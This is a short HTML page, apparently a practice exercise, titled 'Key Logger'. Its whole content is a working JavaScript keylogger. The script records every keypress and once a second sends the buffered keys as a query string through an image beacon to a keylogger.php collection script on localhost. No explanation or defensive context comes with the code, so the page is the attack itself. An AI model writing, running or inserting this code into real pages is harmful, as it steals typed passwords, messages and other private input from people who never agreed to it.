<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger</title>
</head>
<body>
    <script>
        var buffer = [];
      
        document.onkeypress = function(e) {
            var timestamp = Date.now() | 0;
            var stroke = e.key;
            buffer.push(stroke);
        }
      
        window.setInterval(function() {
            if (buffer.length > 0) {
                var data = buffer;
                new Image().src = 'http://localhost/web_dev/keylogger.php?c=' + data;
                buffer = [];
            }
        }, 1000);
    </script>
</body>
</html>
